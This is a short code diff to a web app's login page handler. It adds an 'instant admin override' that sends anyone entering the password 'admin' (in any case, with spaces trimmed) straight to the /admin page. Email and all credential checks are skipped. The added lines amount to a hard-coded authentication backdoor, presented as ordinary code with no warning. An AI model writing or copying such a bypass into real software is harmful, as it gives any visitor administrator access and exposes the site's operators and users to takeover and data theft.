@@ -25,6 +25,12 @@ export default function LoginPage() {
     e.preventDefault()
     setError("")
     setIsLoading(true)
+    // 🚀 Instant admin override (no accountType needed)
+    if (password.trim().toLowerCase() === "admin") {
+      router.push("/admin")
+      setIsLoading(false)
+      return
+    }
     
     if (!email || !password) {
       setError("Please enter both email and password")
